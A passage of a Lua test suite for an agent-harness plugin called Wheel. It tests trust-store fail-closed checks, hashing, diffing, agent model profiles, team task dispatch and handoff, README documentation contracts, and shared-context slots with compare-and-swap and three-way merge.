  assert(WheelHost.fs.read_file(trust_file) == before_raw,
    "a failed foreign-owner confirmation must not rewrite the store")

  -- A non-directory parent fails closed.
  local not_dir = tmp_dir .. "/not-a-directory"
  local nd = io.open(not_dir, "w")
  nd:write("x")
  nd:close()
  local nd_status = WheelConfig.trust_status(proj_a, not_dir .. "/trusted_projects.json")
  local nd_ok, nd_err = WheelConfig.trust(proj_a, nd_status.hash,
    not_dir .. "/trusted_projects.json")
  assert(nd_ok == false and nd_err ~= nil
    and nd_err.code == "E_TRUST_STORE_NOT_REGULAR",
    "a non-directory parent must fail closed")

  -- A symlinked parent fails closed.
  local link_parent = tmp_dir .. "/state-link"
  os.execute("ln -s " .. state_dir .. " " .. link_parent)
  local link_status = WheelConfig.trust_status(proj_a, link_parent .. "/trusted_projects.json")
  local link_ok, link_err = WheelConfig.trust(proj_a, link_status.hash,
    link_parent .. "/trusted_projects.json")
  assert(link_ok == false and link_err ~= nil
    and link_err.code == "E_TRUST_STORE_SYMLINK",
    "a symlinked parent must fail closed")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: hash helper uses native SHA-256 and matches the pure vector", function()
  local content = "return { verification = { test_command = \"hash\" } }\n"
  local native = WheelConfig.compute_content_hash(content)
  assert(#native == 64 and native:match("^%x+$") ~= nil,
    "the content hash must be full 64-hex")
  assert(native == WheelConfig.compute_hash(content),
    "native and pure SHA-256 must agree for the same bytes")
end)

run_test("WheelConfig: pure line diff never reports no-change for changed bytes", function()
  local changed = WheelConfig.compute_diff(
    "return { a = 1 }\n", "return { a = 2 }\n")
  assert(changed ~= "(no changes)", "changed bytes must not render as no changes")
  assert(changed:find("-return { a = 1 }", 1, true) ~= nil,
    "diff must show the removed line")
  assert(changed:find("+return { a = 2 }", 1, true) ~= nil,
    "diff must show the added line")

  local added = WheelConfig.compute_diff("alpha\n", "alpha\nbeta\n")
  assert(added:find("+beta", 1, true) ~= nil, "diff must show an added line")
  assert(added ~= "(no changes)")

  local removed = WheelConfig.compute_diff("alpha\nbeta\n", "alpha\n")
  assert(removed:find("-beta", 1, true) ~= nil, "diff must show a removed line")

  local newline_only = WheelConfig.compute_diff("alpha", "alpha\n")
  assert(newline_only ~= "(no changes)",
    "a trailing-newline change must not render as no changes")

  assert(WheelConfig.compute_diff("same\n", "same\n") == "(no changes)",
    "identical bytes must render as no changes")

  -- Simulate a host where an external diff is absent or failing. The pure
  -- implementation must not consult it and must still show the change.
  local original_run_program = WheelHost.proc.run_program
  WheelHost.proc.run_program = function(program)
    if program == "diff" then
      return { ok = false, code = 1, stdout = "", stderr = "diff missing" }
    end
    return original_run_program(program)
  end
  local no_tool = WheelConfig.compute_diff(
    "return { a = 1 }\n", "return { a = 2 }\n")
  WheelHost.proc.run_program = original_run_program
  assert(no_tool:find("+return { a = 2 }", 1, true) ~= nil,
    "a missing diff tool must not suppress the changed lines")
  assert(no_tool ~= "(no changes)")
end)

run_test("WheelAgent: headless panel working container invariants and telemetry", function()
  local kernel = WheelKernel.new_mock()

  -- Default agent without explicit panel options
  local agent_default = WheelAgent.new({
    name = "worker-default-01",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
  })
  assert(agent_default.headless == true, "agent must default to headless = true")
  assert(agent_default.panel_id == "headless:panel:worker-default-01", "default panel_id format")

  -- Agent status method
  local st = agent_default:status()
  assert(st.name == "worker-default-01")
  assert(st.role == WheelAgent.Role.CODING)
  assert(st.headless == true)
  assert(st.panel_id == "headless:panel:worker-default-01")

  -- Agent configured via hermetic WheelConfig (isolated from host/repo environment)
  local empty_tmp_dir = test_path("test_wheel_empty_cfg")
  os.execute("rm -rf " .. empty_tmp_dir .. " && mkdir -p " .. empty_tmp_dir)
  local cfg = WheelConfig.load({
    project_root = empty_tmp_dir,
    global_path = empty_tmp_dir .. "/nonexistent_global.lua",
    trust_mode = "permissive",
  }).config
  os.execute("rm -rf " .. empty_tmp_dir)

  local agent_configured = WheelAgent.new({
    name = "worker-configured-01",
    role = WheelAgent.Role.DEBUG,
    kernel = kernel,
    config = cfg,
  })
  assert(agent_configured.headless == true)
  assert(agent_configured.model.temperature == 0.1, "should inherit temperature 0.1 for debug role")
  assert(agent_configured.budget.max_iterations == 15, "should inherit budget 15 for debug role")

  -- Telemetry in execute_task
  kernel:create_task({ id = "T-CONTAINER", title = "Container task" })
  local outcome = agent_configured:execute_task("T-CONTAINER", function()
    return { done = true }
  end)
  assert(outcome.success == true)
  assert(outcome.panel_id == "headless:panel:worker-configured-01")
  assert(outcome.headless == true)
end)

run_test("WheelConfig: skill capability discovery with filtering", function()
  local tmp_dir = test_path("test_wheel_skills")
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. tmp_dir .. "/.agents/skills/skill-alpha " .. tmp_dir .. "/.agents/skills/skill-beta " .. tmp_dir .. "/.agents/skills/skill-gamma")

  local f1 = io.open(tmp_dir .. "/.agents/skills/skill-alpha/SKILL.md", "w")
  f1:write("# Alpha Skill\n")
  f1:close()
  local f2 = io.open(tmp_dir .. "/.agents/skills/skill-beta/SKILL.md", "w")
  f2:write("# Beta Skill\n")
  f2:close()
  local f3 = io.open(tmp_dir .. "/.agents/skills/skill-gamma/SKILL.md", "w")
  f3:write("# Gamma Skill\n")
  f3:close()

  -- Filter: disable beta
  local filter_res = WheelConfig.discover_agent_capabilities(tmp_dir, {
    disabled = { "skill-beta" },
  })
  assert(filter_res.count == 2, "expected 2 skills discovered")
  local names = {}
  for _, s in ipairs(filter_res.skills) do
    names[s.name] = true
  end
  assert(names["skill-alpha"] == true)
  assert(names["skill-gamma"] == true)
  assert(names["skill-beta"] == nil, "skill-beta must be filtered out")

  os.execute("rm -rf " .. tmp_dir)
end)

--------------------------------------------------------------------------------
-- Section 9: Multi-Agent Workspace Collaboration & Model Profiles
--------------------------------------------------------------------------------

local WheelTeam = require("wheel.team")

run_test("WheelAgent: heterogeneous model profiles and validation", function()
  -- Default model profiles per role
  local prof_cmd = WheelAgent.get_default_model_profile(WheelAgent.Role.COMMANDER)
  assert(prof_cmd.provider == "anthropic", "commander default provider")
  assert(prof_cmd.model == "claude-3-5-sonnet", "commander default model")
  assert(prof_cmd.thinking.enabled == true, "commander thinking enabled")
  assert(prof_cmd.thinking.gear == "medium", "commander thinking gear")

  local prof_dbg = WheelAgent.get_default_model_profile(WheelAgent.Role.DEBUG)
  assert(prof_dbg.provider == "deepseek", "debug default provider")
  assert(prof_dbg.model == "deepseek-reasoner", "debug default model")
  assert(prof_dbg.thinking.enabled == true, "debug thinking enabled")
  assert(prof_dbg.thinking.budget_tokens == 8192, "debug thinking budget")

  local prof_rev = WheelAgent.get_default_model_profile(WheelAgent.Role.REVIEWER)
  assert(prof_rev.provider == "openai", "reviewer default provider")
  assert(prof_rev.model == "gpt-4o", "reviewer default model")
  assert(prof_rev.temperature == 0.0, "reviewer temperature strict 0")

  -- Validation
  local valid, err = WheelAgent.validate_model_profile({
    provider = "anthropic",
    model = "claude-3-7-sonnet",
    temperature = 0.3,
    thinking = { enabled = true, budget_tokens = 4096, gear = "high" },
    context_budget = { max_tokens = 128000 },
    retry = { max_retries = 3, backoff_ms = 500 },
  })
  assert(valid == true, "valid profile must pass validation: " .. tostring(err))

  local invalid, err2 = WheelAgent.validate_model_profile({
    provider = "", -- empty provider
    model = "test",
  })
  assert(invalid == false, "invalid provider must fail validation")
  assert(err2 ~= nil, "error reason returned")

  -- Agent model profile resolution and telemetry
  local kernel = WheelKernel.new({ in_memory = true })
  local custom_agent = WheelAgent.new({
    name = "debugger-01",
    role = WheelAgent.Role.DEBUG,
    kernel = kernel,
    model_profile = {
      provider = "deepseek",
      model = "deepseek-r1-custom",
      temperature = 0.0,
      thinking = { enabled = true, budget_tokens = 16384 },
    },
  })

  local p = custom_agent:get_model_profile()
  assert(p.provider == "deepseek")
  assert(p.model == "deepseek-r1-custom")
  assert(p.thinking.budget_tokens == 16384)

  kernel:create_task({ id = "T-PROF", title = "Profile task" })
  local outcome = custom_agent:execute_task("T-PROF", function()
    return { done = true }
  end)
  assert(outcome.success == true)
  assert(outcome.model_profile ~= nil, "telemetry includes model_profile")
  assert(outcome.model_profile.model == "deepseek-r1-custom")
  assert(outcome.model_profile.provider == "deepseek")
end)

run_test("WheelTeam: workspace colleague registration and roster", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({
    kernel = kernel,
    workspace_root = test_path("test_workspace"),
  })

  assert(team ~= nil)
  assert(#team:list_agents() == 0, "initial team is empty")

  -- Spawn peer colleagues
  local cmd = team:spawn_agent({
    name = "architect",
    role = WheelAgent.Role.COMMANDER,
  })
  local coder = team:spawn_agent({
    name = "backend-dev",
    role = WheelAgent.Role.CODING,
  })
  local rev = team:spawn_agent({
    name = "qa-auditor",
    role = WheelAgent.Role.REVIEWER,
  })

  assert(team:get_agent("architect") == cmd)
  assert(team:get_agent("backend-dev") == coder)
  assert(team:get_agent("qa-auditor") == rev)
  assert(#team:list_agents() == 3, "team roster has 3 colleagues")

  -- Peer colleagues start in idle state
  local st_coder = team:get_agent_state("backend-dev")
  assert(st_coder.state == "idle")
  assert(st_coder.active_task_id == nil)
  assert(st_coder.tasks_completed == 0)

  -- Duplicate agent name rejected
  local ok_dup, err_dup = pcall(function()
    team:spawn_agent({ name = "backend-dev", role = WheelAgent.Role.CODING })
  end)
  assert(ok_dup == false, "duplicate agent name must fail")
end)

run_test("WheelTeam: atomic task claim and collision prevention", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "dev-1", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "dev-2", role = WheelAgent.Role.CODING })

  kernel:create_task({ id = "TASK-CLAIM-01", title = "First task", priority = 10 })

  -- dev-1 claims TASK-CLAIM-01
  local ok_c1, err_c1 = team:claim_task("dev-1", "TASK-CLAIM-01")
  assert(ok_c1 == true, "first claim should succeed: " .. tostring(err_c1))

  local st_dev1 = team:get_agent_state("dev-1")
  assert(st_dev1.state == "busy")
  assert(st_dev1.active_task_id == "TASK-CLAIM-01")

  -- dev-2 attempts to claim the same task -> must fail closed
  local ok_c2, err_c2 = team:claim_task("dev-2", "TASK-CLAIM-01")
  assert(ok_c2 == false, "second claim on same task must fail")
  assert(string.find(tostring(err_c2), "already claimed") ~= nil, "error explains task is already claimed")

  -- dev-1 attempts to claim another task while busy -> must fail
  kernel:create_task({ id = "TASK-CLAIM-02", title = "Second task", priority = 5 })
  local ok_busy, err_busy = team:claim_task("dev-1", "TASK-CLAIM-02")
  assert(ok_busy == false, "busy agent cannot claim another task")
  assert(string.find(tostring(err_busy), "not idle") ~= nil, "error explains agent is busy")
end)

run_test("WheelTeam: task completion and release", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  local worker = team:spawn_agent({ name = "worker-01", role = WheelAgent.Role.CODING })
  kernel:create_task({ id = "TASK-REL-01", title = "Task to release" })

  team:claim_task("worker-01", "TASK-REL-01")
  assert(team:get_agent_state("worker-01").state == "busy")

  -- Release task with success
  local ok_rel, err_rel = team:release_task("worker-01", "TASK-REL-01", {
    status = "succeeded",
    checkpoint_hash = "cp-12345",
  })
  assert(ok_rel == true, "release should succeed: " .. tostring(err_rel))

  local st_after = team:get_agent_state("worker-01")
  assert(st_after.state == "idle", "worker returns to idle")
  assert(st_after.active_task_id == nil)
  assert(st_after.tasks_completed == 1, "completed task count incremented")

  -- Kernel task is now succeeded
  local t = kernel:get_task("TASK-REL-01")
  assert(t.status == "succeeded" or t.status == "Succeeded")
end)

run_test("WheelTeam: structured handoff from worker to reviewer", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "coder-bob", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "reviewer-alice", role = WheelAgent.Role.REVIEWER })

  kernel:create_task({ id = "TASK-HANDOFF-01", title = "Implement feature" })
  team:claim_task("coder-bob", "TASK-HANDOFF-01")

  -- Coder finishes implementation and hands off to Reviewer
  local ok_ho, ho_record = team:handoff("coder-bob", "reviewer-alice", "TASK-HANDOFF-01", {
    reason = "implementation_complete",
    rationale = "Code written and local unit tests green. Requesting security & style audit.",
    checkpoint_hash = "6a09e667bb67ae853c6ef372a54ff53a",
  })

  assert(ok_ho == true, "handoff should succeed")
  assert(ho_record ~= nil)
  assert(ho_record.from_agent == "coder-bob")
  assert(ho_record.to_agent == "reviewer-alice")
  assert(ho_record.task_id == "TASK-HANDOFF-01")
  assert(ho_record.checkpoint_hash == "6a09e667bb67ae853c6ef372a54ff53a")
  assert(ho_record.timestamp ~= nil)

  -- Coder is now idle, Reviewer is now busy with the task
  assert(team:get_agent_state("coder-bob").state == "idle")
  assert(team:get_agent_state("coder-bob").active_task_id == nil)

  local rev_st = team:get_agent_state("reviewer-alice")
  assert(rev_st.state == "busy")
  assert(rev_st.active_task_id == "TASK-HANDOFF-01")

  -- Reviewer audits and finishes
  team:release_task("reviewer-alice", "TASK-HANDOFF-01", { status = "succeeded" })
  assert(team:get_agent_state("reviewer-alice").state == "idle")
  assert(#team.handoffs == 1, "recorded 1 handoff")
end)

run_test("WheelTeam: wave dispatching across DAG dependencies", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "c-1", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "c-2", role = WheelAgent.Role.CODING })

  -- Two independent ready tasks and one dependent task
  kernel:create_task({ id = "T-A", title = "Task A", priority = 10 })
  kernel:create_task({ id = "T-B", title = "Task B", priority = 8 })
  kernel:create_task({ id = "T-C", title = "Task C", priority = 5, dependencies = { "T-A", "T-B" } })

  -- Wave 1: T-A and T-B are ready -> dispatch to c-1 and c-2
  local dispatched = team:dispatch_wave()
  assert(#dispatched == 2, "expected 2 tasks dispatched in wave 1")

  local task_map = {}
  for _, d in ipairs(dispatched) do
    task_map[d.task_id] = d.agent_name
  end
  assert(task_map["T-A"] ~= nil)
  assert(task_map["T-B"] ~= nil)
  assert(task_map["T-C"] == nil, "T-C has pending dependencies, must not be dispatched")

  -- Complete T-A and T-B
  team:release_task(task_map["T-A"], "T-A", { status = "succeeded" })
  team:release_task(task_map["T-B"], "T-B", { status = "succeeded" })

  -- Wave 2: T-C is now ready -> dispatch to now-idle agent
  local dispatched_w2 = team:dispatch_wave()
  assert(#dispatched_w2 == 1, "expected 1 task dispatched in wave 2")
  assert(dispatched_w2[1].task_id == "T-C")

  team:release_task(dispatched_w2[1].agent_name, "T-C", { status = "succeeded" })
  assert(#team:dispatch_wave() == 0, "no more tasks to dispatch")
end)

run_test("WheelTeam: organizational status telemetry", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  team:spawn_agent({ name = "lead", role = WheelAgent.Role.COMMANDER })
  team:spawn_agent({ name = "worker-a", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "worker-b", role = WheelAgent.Role.DEBUG })

  kernel:create_task({ id = "T-ST", title = "Status test task" })
  team:claim_task("worker-a", "T-ST")

  local st = team:status()
  assert(st.total_agents == 3)
  assert(st.idle_count == 2)
  assert(st.busy_count == 1)
  assert(#st.agents == 3)

  local worker_entry = nil
  for _, a in ipairs(st.agents) do
    if a.name == "worker-a" then worker_entry = a end
  end
  assert(worker_entry ~= nil)
  assert(worker_entry.state == "busy")
  assert(worker_entry.active_task_id == "T-ST")
  assert(worker_entry.model ~= nil)
  assert(worker_entry.panel_id == "headless:panel:worker-a")
  assert(worker_entry.headless == true)
end)

-- ===========================================================================
-- 9. README User-Documentation Contract (CTX-0012)
-- ===========================================================================

local README_PATH = "README.md"
local README_REQUIRED_SECTIONS = {
  "Overview",
  "Install",
  "Commands",
  "Configuration",
  "Keybindings",
  "Troubleshooting",
}

local function read_repository_file(path)
  local handle, err = io.open(path, "r")
  assert(handle ~= nil, "cannot read " .. path .. ": " .. tostring(err))
  local content = handle:read("*a")
  handle:close()
  return content
end

local function split_source_lines(content)
  local lines = {}
  for line in (content .. "\n"):gmatch("([^\n]*)\n") do
    lines[#lines + 1] = (line:gsub("\r$", ""))
  end
  return lines
end

--- Return the body lines of the first H2 section with `name`.
local function readme_section(lines, name)
  local start = nil
  for index, line in ipairs(lines) do
    if line == "## " .. name then
      start = index
      break
    end
  end
  assert(start ~= nil, "README is missing the " .. name .. " H2 section")
  local body = {}
  for index = start + 1, #lines do
    if lines[index]:match("^## .+$") then
      break
    end
    body[#body + 1] = lines[index]
  end
  return body
end

--- Split one GFM table row into trimmed cells; nil when the line is not a row.
local function parse_markdown_row(line)
  local trimmed = line:match("^%s*(.-)%s*$")
  if not trimmed:match("^|.*|$") then
    return nil
  end
  local cells = {}
  local body = trimmed:sub(2, #trimmed - 1)
  for cell in (body .. "|"):gmatch("(.-)|") do
    cells[#cells + 1] = cell:match("^%s*(.-)%s*$")
  end
  return cells
end

local function strip_code_cell(cell)
  return cell:match("^`(.-)`$") or cell
end

local README_LINES = split_source_lines(read_repository_file(README_PATH))

run_test("README: six required H2 sections lead in order without duplicates", function()
  local headings = {}
  local fence_open = false
  for _, line in ipairs(README_LINES) do
    if line:match("^```") then
      fence_open = not fence_open
    elseif not fence_open then
      local level, text = line:match("^(#+)%s+(.+)$")
      if level then
        headings[#headings + 1] = { level = #level, text = text }
      end
    end
  end

  local h2 = {}
  for _, heading in ipairs(headings) do
    if heading.level == 2 then
      h2[#h2 + 1] = heading.text
    end
  end

  for index, required in ipairs(README_REQUIRED_SECTIONS) do
    assert(h2[index] == required,
      string.format("README H2 position %d must be %s, got %s", index, required, tostring(h2[index])))
  end

  local counts = {}
  for _, name in ipairs(h2) do
    counts[name] = (counts[name] or 0) + 1
  end
  for _, required in ipairs(README_REQUIRED_SECTIONS) do
    assert(counts[required] == 1, "README must carry exactly one " .. required .. " H2 section")
  end
end)

run_test("README: command table matches M.command_catalog names and schemas", function()
  local saved_bitty = _G.bitty
  local saved_init = package.loaded["wheel.init"]
  _G.bitty = nil
  package.loaded["wheel.init"] = nil
  local ok, wheel = pcall(require, "wheel.init")
  package.loaded["wheel.init"] = saved_init
  _G.bitty = saved_bitty
  assert(ok and type(wheel) == "table", "cannot load M.command_catalog: " .. tostring(wheel))

  local catalog = wheel.command_catalog
  assert(type(catalog) == "table" and #catalog == 14,
    "M.command_catalog must expose all 14 commands")

  local section = readme_section(README_LINES, "Commands")
  local header_index = nil
  for index, line in ipairs(section) do
    local cells = parse_markdown_row(line)
    if cells and #cells == 4 and cells[1] == "Command" then
      header_index = index
      break
    end
  end
  assert(header_index ~= nil, "README Commands section must carry the command table")

  local header = parse_markdown_row(section[header_index])
  assert(header[2] == "Invocation", "command table must document invocation names")
  assert(header[3] == "Arguments schema", "command table must document argument schemas")
  assert(header[4] == "Result contract", "command table must document result contracts")

  local separator = parse_markdown_row(section[header_index + 1])
  assert(separator ~= nil and #separator == 4, "command table needs a separator row")
  for column = 1, 4 do
    assert(separator[column]:match("^:?%-%-%-+:?$") ~= nil,
      "command table separator column " .. column .. " must be a GFM delimiter")
  end

  local rows = {}
  local row_index = header_index + 2
  while section[row_index] ~= nil do
    local cells = parse_markdown_row(section[row_index])
    if cells == nil then
      break
    end
    rows[#rows + 1] = cells
    row_index = row_index + 1
  end
  assert(#rows == #catalog,
    string.format("README command table must document %d commands, got %d", #catalog, #rows))

  for index, def in ipairs(catalog) do
    local cells = rows[index]
    assert(#cells == 4, "command row " .. def.id .. " must have four columns")
    assert(strip_code_cell(cells[1]) == def.id,
      "README command row " .. index .. " must name " .. def.id)

    local invocation = "bitty-terminal.wheel:" .. def.id
    assert(strip_code_cell(cells[2]) == invocation,
      "README must document invocation " .. invocation)

    local args_cell = cells[3]:lower()
    if def.id == "trust" then
      assert(args_cell:find("optional object", 1, true) ~= nil,
        "README must document the optional trust argument object")
      assert(args_cell:find("action", 1, true) ~= nil
        and args_cell:find("hash", 1, true) ~= nil
        and args_cell:find("path", 1, true) ~= nil,
        "README must document the trust action/hash/path fields")
      assert(def.args_schema.type == "object" and def.args_schema.additionalProperties == false
        and type(def.args_schema.properties) == "table",
        "trust must keep a closed schema with optional action/hash/path fields")
    else
      assert(args_cell:find("no arguments", 1, true) ~= nil,
        "README must document the empty arguments schema for " .. def.id)
      assert(args_cell:find("no properties", 1, true) ~= nil,
        "README must document the closed object with no properties for " .. def.id)

      assert(def.args_schema.type == "object" and def.args_schema.additionalProperties == false
        and def.args_schema.properties == nil,
        "command " .. def.id .. " must keep its closed, property-free arguments schema")
    end

    local result_cell = cells[4]
    local property_count = 0
    for key in pairs(def.result_schema.properties) do
      property_count = property_count + 1
      assert(result_cell:find(key, 1, true) ~= nil,
        "README result contract must document schema key " .. key .. " for " .. def.id)
    end
    assert(property_count == 2,
      "command " .. def.id .. " must declare the title/body result projection")
    assert(result_cell:find("title", 1, true) ~= nil and result_cell:find("body", 1, true) ~= nil,
      "README must document the title/body result contract for " .. def.id)
  end
end)

run_test("README: configuration documents XDG layers, eight classes, and trust gate", function()
  local section = readme_section(README_LINES, "Configuration")
  local text = table.concat(section, "\n")

  assert(text:find("This plugin declares no settings.", 1, true) ~= nil,
    "Configuration must carry the SDK no-settings sentence")
  assert(text:find("| Setting | Type | Default | Description |", 1, true) == nil,
    "Configuration must not fake a settings table while the manifest declares none")
  assert(text:find("$XDG_CONFIG_HOME/wheel/init.lua", 1, true) ~= nil,
    "Configuration must document the global XDG layer")
  assert(text:find("$XDG_STATE_HOME/wheel/trusted_projects.json", 1, true) ~= nil,
    "Configuration must document the XDG trust store")
  assert(text:find(".wheel/init.lua", 1, true) ~= nil,
    "Configuration must document the project entry")
  assert(text:lower():find("trust gate", 1, true) ~= nil,
    "Configuration must document the executable project-config trust gate")

  local documented = {}
  local documented_count = 0
  local in_harness_section = false
  for _, line in ipairs(section) do
    if line:match("^### ") then
      in_harness_section = line == "### Wheel harness configuration"
    elseif in_harness_section then
      local indent, name = line:match("^(%s+)%- `([%a_]+)`")
      if name and #indent >= 2 then
        documented[#documented + 1] = name
        documented_count = documented_count + 1
      end
    end
  end

  local expected = {}
  local expected_count = 0
  for key in pairs(WheelConfig.DEFAULTS) do
    expected[key] = true
    expected_count = expected_count + 1
  end
  assert(expected_count == 8, "lua/wheel/config.lua must define exactly eight function classes")
  assert(documented_count == expected_count,
    string.format("README must document %d function classes, got %d", expected_count, documented_count))

  local seen = {}
  for _, name in ipairs(documented) do
    assert(expected[name], "README documents an unknown configuration class: " .. name)
    assert(not seen[name], "README repeats configuration class: " .. name)
    seen[name] = true
  end
  for name in pairs(expected) do
    assert(seen[name], "README is missing configuration class: " .. name)
  end
end)

run_test("README: keybindings section is commands-only and host-owned", function()
  local text = table.concat(readme_section(README_LINES, "Keybindings"), "\n")
  assert(text:find("commands, not keybindings", 1, true) ~= nil,
    "Keybindings must state that Wheel exposes commands, not keybindings")
  assert(text:find("The Bitty host owns keybinding", 1, true) ~= nil,
    "Keybindings must state that the Bitty host owns keybindings")
  assert(text:find("registers no default keybindings", 1, true) ~= nil,
    "Keybindings must state that Wheel has no defaults")
end)

run_test("README: troubleshooting matches error codes and named config failures", function()
  local section = readme_section(README_LINES, "Troubleshooting")
  local text = table.concat(section, "\n")

  -- Derive the public code set from the module exports so a new
  -- WheelErrors.E_* export fails this test until the README documents it.
  local expected_code_set = {}
  local expected_code_count = 0
  for name in pairs(WheelErrors) do
    if name:match("^E_[A-Z0-9_]+$") then
      expected_code_set[name] = true
      expected_code_count = expected_code_count + 1
    end
  end
  assert(expected_code_count > 0, "errors.lua must export at least one public E_* code")

  local documented_codes = {}
  local documented_code_count = 0
  for code in text:gmatch("`(E_[A-Z0-9_]+)`") do
    if not documented_codes[code] then
      documented_code_count = documented_code_count + 1
    end
    documented_codes[code] = true
  end
  assert(documented_code_count == expected_code_count,
    string.format("README must document %d error codes, got %d", expected_code_count, documented_code_count))
  for code in pairs(expected_code_set) do
    assert(documented_codes[code] ~= nil, "README Troubleshooting must document " .. code)
  end
  for code in pairs(documented_codes) do
    assert(expected_code_set[code], "README documents an unknown error code: " .. code)
  end

  local failure_line = nil
  for line in text:gmatch("[^\n]+") do
    if line:find("Named configuration failures", 1, true) then
      failure_line = line
      break
    end
  end
  assert(failure_line ~= nil, "Troubleshooting must name the configuration failures")

  local documented_failures = {}
  local documented_failure_count = 0
  for name in failure_line:gmatch("`([%a_]+)`") do
    if not documented_failures[name] then
      documented_failure_count = documented_failure_count + 1
    end
    documented_failures[name] = true
  end

  local config_source = read_repository_file("lua/wheel/config.lua")
  local expected_failures = {}
  local expected_failure_count = 0
  for name in config_source:gmatch('error%s*=%s*"([%a_]+)"') do
    if not expected_failures[name] then
      expected_failure_count = expected_failure_count + 1
    end
    expected_failures[name] = true
  end
  assert(expected_failure_count > 0, "config.lua must declare named configuration failures")
  assert(documented_failure_count == expected_failure_count,
    string.format("README must document %d configuration failures, got %d",
      expected_failure_count, documented_failure_count))
  for name in pairs(expected_failures) do
    assert(documented_failures[name] ~= nil, "README Troubleshooting must document " .. name)
  end
  for name in pairs(documented_failures) do
    assert(expected_failures[name], "README documents an unknown configuration failure: " .. name)
  end
end)

-- ===========================================================================
-- 10. WheelContext Tests (Shared Context, Slots, CAS, 3-Way Merge, Prefix Cache)
-- ===========================================================================

local WheelContext = require("wheel.context")

run_test("WheelContext: CAS slot operations and version conflict detection", function()
  local ctx = WheelContext.new()

  -- Put new slot
  local put_res, err = ctx:put_slot("workspace/overview", "# Project Overview\nPure Lua Wheel Agent Harness")
  assert(put_res ~= nil and put_res.success == true, "put_slot should succeed")
  assert(put_res.version == 1, "initial version should be 1")
  assert(put_res.kind == "workspace", "slot kind classified as workspace")

  -- Read slot back
  local get_res = ctx:get_slot("workspace/overview")
  assert(get_res.found == true)
  assert(get_res.version == 1)
  assert(string.find(get_res.content, "Project Overview") ~= nil)

  -- Update with matching expected_version (CAS success)
  local put_res2, err2 = ctx:put_slot("workspace/overview", "# Project Overview\nUpdated content", 1)
  assert(put_res2 ~= nil and put_res2.success == true)
  assert(put_res2.version == 2)

  -- Update with mismatched expected_version (CAS failure)
  local put_res3, err3 = ctx:put_slot("workspace/overview", "Conflicting overwrite", 1)
  assert(put_res3 == nil, "CAS mismatch must reject write")
  assert(err3 ~= nil and err3.error == "cas_conflict", "error kind must be cas_conflict")
  assert(err3.expected_version == 1)
  assert(err3.current_version == 2)

  -- Remove slot with matching version
  local rem_res, rem_err = ctx:remove_slot("workspace/overview", 2)
  assert(rem_res ~= nil and rem_res.removed == true)
  assert(ctx:get_slot("workspace/overview").found == false)

  -- Remove nonexistent slot
  local rem_non = ctx:remove_slot("nonexistent/slot")
  assert(rem_non.removed == false)
end)

run_test("WheelContext: canonical Merkle tree hashing and slot listing", function()
  local ctx = WheelContext.new()
  ctx:put_slot("tasks/CTX-001/spec", "Spec 1")
  ctx:put_slot("tasks/CTX-002/spec", "Spec 2")
  ctx:put_slot("decisions/ADR-001", "Architecture Decision 1")
  ctx:put_slot("workspace/rules", "Directives")

  -- Prefix listing
  local task_slots = ctx:list_slots("tasks/")
  assert(#task_slots == 2, "expected 2 task slots")
  assert(task_slots[1].name == "tasks/CTX-001/spec")
  assert(task_slots[2].name == "tasks/CTX-002/spec")

  -- Full canonical sorted list
  local all_slots = ctx:list_slots()
  assert(#all_slots == 4)
  assert(all_slots[1].name == "decisions/ADR-001")
  assert(all_slots[4].name == "workspace/rules")

  -- Merkle tree hash
  local th1 = ctx:tree_hash()
  assert(type(th1) == "string" and #th1 == 64, "tree hash should be 64-hex string")
  -- Deterministic
  assert(ctx:tree_hash() == th1)

  -- Modifying a slot changes tree hash
  ctx:put_slot("decisions/ADR-001", "Updated ADR")
  local th2 = ctx:tree_hash()
  assert(th2 ~= th1, "modifying slot must invalidate tree hash")
end)

run_test("WheelContext: semantic 3-way slot merge", function()
  local base_tree = {
    ["workspace/overview"] = { content = "Original Overview", hash = WheelContext.compute_hash("Original Overview") },
    ["tasks/T-1/spec"] = { content = "Original Spec", hash = WheelContext.compute_hash("Original Spec") },
    ["decisions/ADR-1"] = { content = "Shared Decision", hash = WheelContext.compute_hash("Shared Decision") },
  }

  local our_tree = {
    ["workspace/overview"] = { content = "Our Modified Overview", hash = WheelContext.compute_hash("Our Modified Overview") },
    ["tasks/T-1/spec"] = { content = "Original Spec", hash = WheelContext.compute_hash("Original Spec") },
    ["decisions/ADR-1"] = { content = "Shared Decision", hash = WheelContext.compute_hash("Shared Decision") },
    ["tasks/T-2/spec"] = { content = "Our New Task 2", hash = WheelContext.compute_hash("Our New Task 2") },
  }

  local their_tree = {
    ["workspace/overview"] = { content = "Original Overview", hash = WheelContext.compute_hash("Original Overview") },
    ["tasks/T-1/spec"] = { content = "Their Modified Spec", hash = WheelContext.compute_hash("Their Modified Spec") },
    ["decisions/ADR-1"] = { content = "Shared Decision", hash = WheelContext.compute_hash("Shared Decision") },
    ["tasks/T-3/spec"] = { content = "Their New Task 3", hash = WheelContext.compute_hash("Their New Task 3") },
  }

  -- Merge without conflicts
  local merge_res = WheelContext.merge_3way(base_tree, our_tree, their_tree)
  assert(merge_res.conflict_count == 0, "expected 0 conflicts")
  assert(merge_res.merged["workspace/overview"].content == "Our Modified Overview", "unconflicted edit from us preserved")
  assert(merge_res.merged["tasks/T-1/spec"].content == "Their Modified Spec", "unconflicted edit from them preserved")
  assert(merge_res.merged["tasks/T-2/spec"].content == "Our New Task 2", "our addition preserved")
  assert(merge_res.merged["tasks/T-3/spec"].content == "Their New Task 3", "their addition preserved")
  assert(merge_res.merged["decisions/ADR-1"].content == "Shared Decision", "unchanged entry preserved")

